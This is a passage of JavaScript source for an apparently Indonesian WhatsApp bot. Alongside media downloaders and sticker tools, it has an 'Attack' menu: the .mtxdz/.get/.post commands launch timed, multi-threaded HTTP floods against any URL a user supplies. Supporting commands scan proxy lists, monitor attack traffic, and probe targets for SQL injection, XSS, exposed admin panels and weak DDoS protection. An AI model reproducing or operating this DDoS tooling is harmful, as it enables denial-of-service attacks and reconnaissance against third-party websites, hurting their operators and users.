              caption += `│⎋.𝐀𝐧𝐲𝐜𝐚𝐬𝐭 : ${report.anycast}\n`;
              caption += `│⎋.𝐃𝐞𝐠𝐫𝐚𝐝𝐚𝐭𝐢𝐨𝐧 : ${report.loadDegradation}\n`;
              caption += `│⎋.𝐆𝐡𝐨𝐬𝐭 𝐓𝐫𝐚𝐟𝐢𝐤 : ${report.trafficAnomaly}\n`;
              caption += `├────[『 𝐇𝐞𝐚𝐝𝐞𝐫𝐬 』\n`;
              caption += `│⎋.𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 : ${report.securityHeaders.present.length} 𝐀𝐤𝐭𝐢𝐟 (${report.securityHeaders.present.join(', ') || '-'})\n`;
              if (report.securityHeaders.missing.length) caption += `│⎋.𝐌𝐢𝐬𝐬𝐢𝐧𝐠 : ${report.securityHeaders.missing.slice(0,3).join(', ')}\n`;
              caption += `│⎋.𝐓𝐞𝐜𝐡 𝐒𝐭𝐚𝐜𝐤 : ${Array.isArray(report.techStack) ? report.techStack.slice(0,4).join(', ') : report.techStack}\n`;
              caption += `├────[『 𝐕𝐮𝐥𝐧 𝐒𝐜𝐚𝐧 』\n`;
              caption += `│⎋.𝐒𝐐𝐋𝐢 : ${report.sqlInjection}\n`;
              caption += `│⎋.𝐗𝐒𝐒 : ${report.xssReflected}\n`;
              caption += `│⎋.𝐃𝐢𝐫 𝐋𝐢𝐬𝐭 : ${report.directoryListing}\n`;
              caption += `│⎋.𝐁𝐚𝐜𝐤𝐮𝐩 : ${report.backupFiles}\n`;
              caption += `│⎋.𝐀𝐝𝐦𝐢𝐧 : ${report.adminPanels}\n`;
              caption += `│⎋.𝐎𝐩𝐞𝐧 𝐑𝐞𝐝𝐢𝐫 : ${report.openRedirect}\n`;
              caption += `│⎋.𝐂𝐎𝐑𝐒 : ${report.cors}\n`;
              caption += `│⎋.𝐂𝐒𝐑𝐅 : ${report.csrfToken}\n`;
              caption += `│⎋.𝐂𝐒𝐏 : ${report.cspWeakness}\n`;
              caption += `│⎋.𝐄𝐦𝐚𝐢𝐥𝐬 : ${report.emailsFound}\n`;
              caption += `│⎋.𝐈𝐏 𝐈𝐧𝐭𝐞𝐫𝐧𝐚𝐥 : ${report.internalIpDisclosure}\n`;
              caption += `│⎋.𝐓𝐋𝐒 𝐑𝐚𝐭𝐢𝐧𝐠 : ${report.sslRating}\n`;
              caption += `│⎋.𝐇𝐒𝐓𝐒 𝐏𝐫𝐞𝐥𝐨𝐚𝐝 : ${report.hstsPreload}\n`;
              caption += `├────[『 𝐒𝐜𝐨𝐫𝐞 𝐅𝐢𝐧𝐚𝐥 』\n`;
              caption += `│⎋.𝐒𝐜𝐨𝐫𝐞 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧 : ${report.ddosScore}/100\n`;
              caption += `│⎋.𝐋𝐞𝐯𝐞𝐥 : ${report.ddosLevel}\n`;
              caption += `└───────────────────>`;
              await sock.sendMessage(chatId, { image: screenshotBuffer, caption: caption, contextInfo: { forwardingScore: 9999, isForwarded: true } });
            } catch (e) {
              console.error(e);
              await sendMessage(chatId, `𝐄𝐫𝐫𝐨𝐫: ${e.message.slice(0, 200)}`);
            }
            break;
          }
          case ".info": {
            const sys = getSystemInfo();
            await sendMessage(chatId, `┌────[『 𝐈𝐧𝐟𝐨 𝐁𝐨𝐭 』\n│⎋. 𝐑𝐮𝐧𝐢𝐧𝐠 : ${sys.uptime}\n│⎋. 𝐑𝐚𝐦 𝐏𝐫𝐨𝐬𝐞𝐬 : ${sys.memoryRss}\n│⎋. 𝐑𝐚𝐦 𝐓𝐨𝐭𝐚𝐥 : ${sys.ramTotal}\n│⎋. 𝐅𝐫𝐞𝐞 𝐑𝐚𝐦 : ${sys.ramFree}\n│⎋. 𝐂𝐩𝐮 𝐋𝐨𝐚𝐝 : ${sys.cpuLoad}\n│⎋. 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : ${sys.platform}\n│⎋. 𝐍𝐨𝐝𝐞 : ${sys.nodeVer}\n│⎋. 𝐎𝐰𝐧𝐞𝐫 : ${OWNER_JID.length}\n│⎋. 𝐒𝐞𝐧𝐝 𝐂𝐡𝐚𝐭 : ${totalMessagesSent}\n└───────────────────>`);
            break;
          }
          case ".owner": {
            if (OWNER_JID.length === 0) {
              await sendMessage(chatId, "┌────[『 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭 』\n│⎋. Belum ada owner\n└───────────────────>");
              break;
            }
            let caption = "┌────[『 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭 』\n";
            OWNER_JID.forEach(jid => {
              const number = jid.split('@')[0];
              caption += `│⎋. @${number}\n`;
            });
            caption += "└───────────────────>";
            await sock.sendMessage(chatId, {
              image: { url: LOGO_URL },
              caption: caption,
              mentions: OWNER_JID,
              contextInfo: { forwardingScore: 9999, isForwarded: true }
            });
            break;
          }
          case ".loadtest": case ".mtxdz": case ".get": case ".post": {
            const link = args[0];
            let time = parseInt(args[1]);
            const concurrency = parseInt(args[2]) || 10;
            if (!link || !time || isNaN(time) || time <= 0) {
              await sendMessage(chatId, `📛 Contoh: ${command} https://google.com 5 20`);
              break;
            }
            const method = command === ".post" ? "post" : "get";
            const preData = await preCheck(link);
            await sendMessage(chatId, `𝐀𝐭𝐭𝐚𝐜𝐤 𝐌𝐨𝐝𝐞 : ${command.toUpperCase()}\n𝐓𝐚𝐫𝐠𝐞𝐭 : ${preData.link}\n𝐓𝐢𝐦𝐞 : ${time}𝐒𝐞𝐜\n𝐓𝐡𝐫𝐞𝐚𝐝 : ${concurrency}`);
            const result = await flood(link, method, concurrency, time);
            await sendMessage(chatId, `𝐀𝐭𝐭𝐚𝐜𝐤 𝐌𝐨𝐝𝐞 : ${command.toUpperCase()}\n𝐋𝐢𝐧𝐤 : ${preData.link}\n𝐅𝐮𝐥𝐥 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 : ${result.total}\n𝐁𝐥𝐨𝐜𝐤𝐞𝐝 : ${result.blocked}\n𝐒𝐮𝐜𝐜𝐞𝐬𝐬 : ${result.success}\n𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧 𝐖𝐞𝐛 : ${preData.protection}`);
            break;
          }
          case ".sticker": {
            const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            if (!quotedMsg) {
              await sendMessage(chatId, "📌 Reply gambar/video dengan perintah .sticker");
              break;
            }
            try {
              const stickerBuffer = await createSticker(quotedMsg, downloadContentFromMessage);
              await sock.sendMessage(chatId, { sticker: stickerBuffer });
            } catch (e) {
              console.error(e);
              await sendMessage(chatId, `❌ Gagal buat stiker: ${e.message}`);
            }
            break;
          }
          case ".tiktok": case ".tt": case ".vt": {
            const link = args[0];
            if (!link || !link.includes("tiktok.com")) {
              await sendMessage(chatId, "Contoh: .tiktok https://vt.tiktok.com/ mp4");
              break;
            }
            const jenis = args[1]?.toLowerCase();
            const type = (jenis === "mp3" || jenis === "audio") ? "mp3" : "mp4";
            await sendMessage(chatId, "𝐓𝐮𝐧𝐠𝐠𝐮 𝐒𝐞𝐛𝐞𝐧𝐭𝐚𝐫!");
            let result;
            try {
              result = await fetchWithRetry(() => tiktokDownload(link, type), 2, 2000);
            } catch (e) {
              console.error(e);
            }
            if (!result || !result.mediaUrl) {
              await sendMessage(chatId, "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!");
              break;
            }
            const { mediaUrl, title, author } = result;
            const caption = `𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝!\n𝐓𝐢𝐭𝐥𝐞 : ${author}\n𝐓𝐲𝐩𝐞 : ${type.toUpperCase()}\n𝐃𝐚𝐫𝐢 : 𝐓𝐢𝐤𝐭𝐨𝐤`;
            try {
              await sock.sendMessage(chatId, {
                [type === "mp3" ? "audio" : "video"]: { url: mediaUrl },
                mimetype: type === "mp3" ? "audio/mpeg" : "video/mp4",
                caption: caption,
                contextInfo: { forwardingScore: 9999, isForwarded: true }
              });
            } catch (e) {
              console.error(e);
              await sendMessage(chatId, "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!");
            }
            break;
          }
          case ".youtube": case ".yt": case ".vy": {
            const link = args[0];
            if (!link || !link.includes("youtu")) {
              await sendMessage(chatId, "Contoh: .youtube https://youtu.be/xxx mp4");
              break;
            }
            const formatArg = args[1]?.toLowerCase();
            let type = 'mp4';
            let quality = '720p';
            if (formatArg === 'mp3' || formatArg === 'audio') {
              type = 'mp3';
            } else if (formatArg === 'mp4' && args[2]) {
              quality = args[2];
            }
            await sendMessage(chatId, "𝐓𝐮𝐧𝐠𝐠𝐮 𝐁𝐞𝐧𝐭𝐚𝐫!");
            let result = await youtubeDownload(link, type, quality);
            if (!result || result.error) {
              const fallback = await youtubeFallbackDownload(link, type);
              if (fallback && fallback.url) {
                try {
                  const resp = await axios.get(fallback.url, { responseType: 'arraybuffer', timeout: 60000 });
                  result = { buffer: Buffer.from(resp.data), title: fallback.title, durationSec: 0 };
                } catch (e) {}
              }
            }
            if (!result || result.error) {
              let errorMsg = "𝐓𝐞𝐫𝐣𝐚𝐝𝐢 𝐊𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧!";
              if (result?.error === "durasi") errorMsg = "𝐃𝐮𝐫𝐚𝐬𝐢 𝐌𝐞𝐧𝐭𝐨𝐤 10 𝐌𝐞𝐧𝐢𝐭";
              else if (result?.error === "ukuran") errorMsg = "𝐓𝐞𝐫𝐥𝐚𝐥𝐮 𝐁𝐞𝐬𝐚𝐫 𝐔𝐤𝐮𝐫𝐚𝐧𝐲𝐚!";
              await sendMessage(chatId, errorMsg);
              break;
            }
            const caption = `𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝!\n𝐓𝐢𝐭𝐥𝐞 : ${result.title}\n𝐓𝐲𝐩𝐞 : ${type.toUpperCase()}\n𝐃𝐚𝐫𝐢 : 𝐘𝐨𝐮𝐓𝐮𝐛𝐞`;
            try {
              await sock.sendMessage(chatId, {
                [type === "mp3" ? "audio" : "video"]: result.buffer,
                mimetype: type === "mp3" ? "audio/mpeg" : "video/mp4",
                caption: caption,
                contextInfo: { forwardingScore: 9999, isForwarded: true }
              });
            } catch (e) {
              console.error(e);
              await sendMessage(chatId, "Error saat mengirim media.");
            }
            break;
          }
          case ".ig": case ".instagram": case ".vi": {
            const link = args[0];
            if (!link || !link.includes("instagram.com")) {
              await sendMessage(chatId, "Contoh: .ig https://www.instagram.com/reel/xxx mp4");
              break;
            }
            const jenis = args[1]?.toLowerCase();
            const type = (jenis === "mp3" || jenis === "audio") ? "mp3" : "mp4";
            await sendMessage(chatId, "𝐓𝐮𝐧𝐠𝐠𝐮 𝐒𝐞𝐛𝐞𝐧𝐭𝐚𝐫");
            const result = await instagramDownload(link, type);
            if (!result || !result.buffer) {
              await sendMessage(chatId, "𝐆𝐚𝐠𝐚𝐥 𝐦𝐞𝐧𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦!\n𝐂𝐨𝐛𝐚 𝐥𝐢𝐧𝐤 𝐥𝐚𝐢𝐧 𝐚𝐭𝐚𝐮 𝐠𝐮𝐧𝐚𝐤𝐚𝐧 .𝐲𝐨𝐮𝐭𝐮𝐛𝐞");
              break;
            }
            const mimetype = type === "mp3" ? "audio/mpeg" : "video/mp4";
            const caption = `𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝!\n𝐓𝐢𝐭𝐥𝐞 : ${result.title}\n𝐓𝐲𝐩𝐞 : ${type.toUpperCase()}\n𝐃𝐚𝐫𝐢 : 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦`;
            await sock.sendMessage(chatId, {
              [type === "mp3" ? "audio" : "video"]: result.buffer,
              mimetype: mimetype,
              caption: caption,
              contextInfo: { forwardingScore: 9999, isForwarded: true }
            });
            break;
          }
          case ".cekhost": {
            const host = args[0];
            if (!host) { await sendMessage(chatId, "Contoh : .cekhost https://google.com"); break; }
            const text = await cekHost(host);
            await sendMessage(chatId, text);
            break;
          }
          case ".cekhold": {
            const link = args[0];
            if (!link) { await sendMessage(chatId, "Contoh: .cekhold https://example.com"); break; }
            if (cekholdTimers.has(chatId)) {
              clearInterval(cekholdTimers.get(chatId).interval);
              cekholdTimers.delete(chatId);
            }
            const initialMsg = await sock.sendMessage(chatId, {
              image: { url: LOGO_URL },
              caption: `𝐂𝐞𝐤 𝐇𝐨𝐥𝐝 𝐒𝐭𝐚𝐫𝐭!\n𝐋𝐢𝐧𝐤 : ${link}\n𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐂𝐡𝐞𝐜𝐤\n𝐓𝐢𝐦𝐞 : 10:00`,
              contextInfo: { forwardingScore: 9999, isForwarded: true }
            });
            const startTimeCekhold = Date.now();
            const durationMs = 10 * 60 * 1000;
            const updateInterval = 10000;
            const checkAndUpdate = async () => {
              const elapsed = Date.now() - startTimeCekhold;
              const remaining = Math.max(0, durationMs - elapsed);
              const minutes = Math.floor(remaining / 60000);
              const seconds = Math.floor((remaining % 60000) / 1000);
              const countdown = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
              let statusText = '𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆';
              try {
                const result = await preCheck(link);
                statusText = result.status === 'Online' ? '𝐎𝐧𝐥𝐢𝐧𝐞' : '𝐃𝐨𝐰𝐧';
                if (result.status === 'Redirect') statusText = '𝐑𝐞𝐝𝐢𝐫𝐞𝐜𝐭';
              } catch (e) {
                statusText = 'Error saat cek';
              }
              const newCaption = `𝐂𝐞𝐤 𝐇𝐨𝐥𝐝 𝐒𝐭𝐚𝐫𝐭!\n𝐋𝐢𝐧𝐤 : ${link}\n𝐒𝐭𝐚𝐭𝐮𝐬 : ${statusText}\n𝐓𝐢𝐦𝐞 : ${countdown}\n𝐔𝐩𝐝𝐚𝐭𝐞 : 10 𝐃𝐞𝐭𝐢𝐤`;
              try {
                await sock.sendMessage(chatId, {
                  image: { url: LOGO_URL },
                  caption: newCaption,
                  contextInfo: { forwardingScore: 9999, isForwarded: true },
                  edit: initialMsg.key
                });
              } catch (e) {
                console.error('Gagal edit pesan cekhold', e);
              }
              if (remaining <= 0) {
                clearInterval(cekholdTimers.get(chatId)?.interval);
                cekholdTimers.delete(chatId);
                try {
                  await sock.sendMessage(chatId, {
                    image: { url: LOGO_URL },
                    caption: `𝐃𝐨𝐧𝐞 𝐂𝐡𝐞𝐜𝐤!\n𝐋??𝐧𝐤 : ${link}\n𝐖𝐞𝐛𝐬𝐢𝐭𝐞 : ${statusText}\n𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 : 10 𝐌𝐞𝐧𝐢𝐭`,
                    contextInfo: { forwardingScore: 9999, isForwarded: true },
                    edit: initialMsg.key
                  });
                } catch (e) {}
              }
            };
            checkAndUpdate();
            const interval = setInterval(checkAndUpdate, updateInterval);
            cekholdTimers.set(chatId, { interval, messageKey: initialMsg.key });
            break;
          }
          case ".http": {
            const targetUrl = args[0];
            if (!targetUrl) {
              await sendMessage(chatId, "Contoh: .http https://google.com");
              break;
            }
            await sendMessage(chatId, "𝐓𝐮𝐧𝐠𝐠𝐮 𝐒𝐞𝐛𝐞𝐧𝐭𝐚𝐫!");
            const result = await httpCheck(targetUrl);
            await sendMessage(chatId, result);
            break;
          }
          case ".proxyscan": {
            const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            if (!quotedMsg || !quotedMsg.documentMessage) {
                await sendMessage(chatId, "𝐓𝐮𝐭𝐨𝐫 : 𝐑𝐞𝐩𝐥𝐚𝐲 𝐟𝐢𝐥𝐞 𝐩𝐫𝐨𝐱𝐲.𝐭𝐱𝐭!");
                break;
            }

            // Kirim gambar awal dengan caption "Tunggu Sebentar!"
            await sock.sendMessage(chatId, {
                image: { url: LOGO_URL },
                caption: "𝐓𝐮𝐧𝐠𝐠𝐮 𝐒𝐞𝐛𝐞𝐧𝐭𝐚𝐫!",
                contextInfo: { forwardingScore: 9999, isForwarded: true }
            });

            const loadingMsg = await sock.sendMessage(chatId, { text: "𝐖𝐚𝐢𝐭𝐢𝐧𝐠!" });

            try {
                const stream = await downloadContentFromMessage(quotedMsg.documentMessage, 'document');
                let buffer = Buffer.from([]);
                for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

                const proxies = parseProxyList(buffer);
                if (proxies.length === 0) {
                    await sock.sendMessage(chatId, { text: "𝐏𝐫𝐨𝐱𝐲 𝐓𝐢𝐝𝐚𝐤 𝐕𝐚𝐥𝐢𝐝!", edit: loadingMsg.key });
                    break;
                }

                await sock.sendMessage(chatId, { text: `𝐒𝐜𝐚𝐧𝐧𝐢𝐧𝐠 : ${proxies.length}`, edit: loadingMsg.key });

                let lastProcessed = 0;
                let activeCount = 0;
                const progressInterval = setInterval(async () => {
                    if (lastProcessed > 0 && lastProcessed < proxies.length) {
                        const percent = ((lastProcessed / proxies.length) * 100).toFixed(1);
                        await sock.sendMessage(chatId, {
                            text: `┌────[『 𝐏𝐫𝐨𝐱𝐲 𝐒𝐜𝐚𝐧 』\n│⎋.𝐒𝐜𝐚𝐧    : ${percent}%\n│⎋.𝐏𝐫𝐨𝐬𝐞𝐬 : ${lastProcessed}\n│⎋.𝐓𝐨𝐭𝐚𝐥   : ${proxies.length}\n│⎋.𝐀𝐤𝐭𝐢𝐟    : ${activeCount}\n└───────────────────>`,
                            edit: loadingMsg.key
                        }).catch(() => {});
                    }
                }, 5000);

                const onProgress = (processed, total, activeFound) => {
                    lastProcessed = processed;
                    activeCount = activeFound;
                };

                const activeProxies = await scanProxyList(proxies, 15, 3000, onProgress);
                clearInterval(progressInterval);

                if (activeProxies.length === 0) {
                    await sock.sendMessage(chatId, { text: "❌ Tidak ada proxy yang aktif.", edit: loadingMsg.key });
                    break;
                }

                const outputPath = generateOutputFile(activeProxies, sampahDir);
                const fileBuffer = fs.readFileSync(outputPath);

                await sock.sendMessage(chatId, {
                    document: fileBuffer,
                    mimetype: "text/plain",
                    fileName: `${activeProxies.length}.txt`,
                    caption: `𝐃𝐨𝐧𝐞 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠!\n𝐓𝐨𝐭𝐚𝐥 𝐏𝐫𝐨𝐱𝐲 : ${proxies.length}\n𝐀𝐤𝐭𝐢𝐟 𝐏𝐫𝐨𝐱𝐲. : ${activeProxies.length}`,
                    contextInfo: { forwardingScore: 9999, isForwarded: true }
                });

                fs.unlinkSync(outputPath);
                await sock.sendMessage(chatId, { delete: loadingMsg.key });

            } catch (err) {
                console.error(err);
                await sock.sendMessage(chatId, { text: `❌ Error: ${err.message.slice(0, 150)}`, edit: loadingMsg.key });
            }
            break;
          }
          //case ".dstat": {
  //await sock.sendMessage(chatId, { react: { text: "⏳", key: m.key } });
  //await startDstat(chatId, sock, sendMessage, LOGO_URL, dstatTimers, sender);
//  break;
//}

case ".dstat": {
  await sock.sendMessage(chatId, { react: { text: "⏳", key: m.key } });
  let timersMap = dstatTimers;
  if (!(timersMap instanceof Map)) {
    timersMap = new Map();
  }
  await startDstat(chatId, sock, sendMessage, LOGO_URL, timersMap, sender);
  break;
}
          case ".help": case ".menu": {
            const greeting = getGreeting();
            const helpText = `👋 𝐇𝐚𝐥𝐨 𝐊𝐚𝐤 𝐒𝐞𝐥𝐚𝐦𝐚𝐭 ${greeting}
┌────[『 𝐈𝐧𝐟𝐨 𝐁𝐨𝐭 』
│𝐀𝐮𝐭𝐡𝐨𝐫 : 𝐃𝐢𝐳 𝐅𝐥𝐲𝐳𝐞
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 2.30.29
│𝐂𝐨𝐝𝐢𝐧𝐠 : 𝐍𝐨𝐝𝐞𝐣𝐬-𝐥𝐭𝐬
│𝐑𝐮𝐧𝐢𝐧𝐠 : 𝐓𝐞𝐫𝐦𝐮𝐱
└───────────────────>
┌────[『 𝐕𝐢𝐩 𝐆𝐫𝐨𝐮𝐩 』
│⎋.𝐀𝐝𝐝
│⎋.𝐊𝐢𝐜𝐤
│⎋.𝐏𝐫𝐨𝐦𝐨𝐭𝐞
│⎋.𝐃𝐞𝐦𝐨𝐭𝐞
│⎋.𝐀𝐧𝐭𝐢𝐥𝐢𝐧𝐤
│⎋.𝐀𝐧𝐭𝐢𝐬𝐩𝐚𝐦
│⎋.𝐅𝐢𝐥𝐭𝐞𝐫
│⎋.𝐒𝐞𝐭𝐧𝐚𝐦𝐞
│⎋.𝐒𝐞𝐭𝐝𝐞𝐬𝐜
│⎋.𝐀𝐧𝐭𝐢𝐯𝐢𝐫𝐭𝐞𝐤
│⎋.𝐏𝐮𝐬𝐡𝐠𝐜
└───────────────────>
┌────[『 𝐕𝐢𝐩 𝐁𝐨𝐭 』
│⎋.𝐋𝐚𝐜𝐚𝐤𝐥𝐨𝐤𝐚𝐬𝐢
│⎋.𝐔𝐧𝐛𝐚𝐧
│⎋.𝐁𝐚𝐧
│⎋.𝐏𝐫𝐨𝐭𝐞𝐤
│⎋.𝐑𝐞𝐩𝐨𝐫𝐭
│⎋.𝐀𝐮𝐭𝐨𝐛𝐚𝐧
│⎋.𝐉𝐩𝐦
│⎋.𝐀𝐮𝐭𝐨𝐛𝐚𝐝𝐚𝐤
│⎋.𝐒𝐞𝐭𝐩𝐩𝐛𝐨𝐭
│⎋.𝐃𝐞𝐥𝐩𝐩𝐛𝐨𝐭
│⎋.𝐎𝐰𝐧𝐞𝐫
└───────────────────>
┌────[『 𝐀𝐭𝐭𝐚𝐜𝐤 』
│⎋.𝐌𝐭𝐱𝐝𝐳
│⎋.𝐆𝐞𝐭
│⎋.𝐏𝐨𝐬𝐭
└───────────────────>
┌────[『 𝐅𝐫𝐞𝐞 𝐅𝐢𝐭𝐮𝐫 』
│⎋.𝐒𝐭𝐢𝐜𝐤𝐞𝐫
│⎋.𝐂𝐞𝐤𝐡𝐨𝐬𝐭 
│⎋.𝐒𝐬𝐰𝐞𝐛
│⎋.𝐂𝐞𝐤𝐡𝐨𝐥𝐝
│⎋.𝐇𝐭𝐭𝐩
│⎋.𝐏𝐫𝐨𝐱𝐲𝐒𝐜𝐚𝐧
│⎋.𝐃𝐬𝐭𝐚𝐭
│⎋.𝐓𝐢𝐤𝐭𝐨𝐤
│⎋.𝐘𝐨𝐮𝐭𝐮𝐛𝐞
│⎋.𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
│⎋.𝐂𝐞𝐤
│⎋.𝐈𝐧𝐟𝐨
└───────────────────>`;
            await sendMessage(chatId, helpText);
            break;
          }
          default: console.log("❓ Apanih :", command);
        }
      } catch (err) {
        console.error("Handler error:", err);
        await sendMessage(chatId, "𝐈𝐧𝐭𝐞𝐫𝐧𝐚𝐥 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐫𝐫𝐨𝐫!");
      }
    });
  });
}
startBot();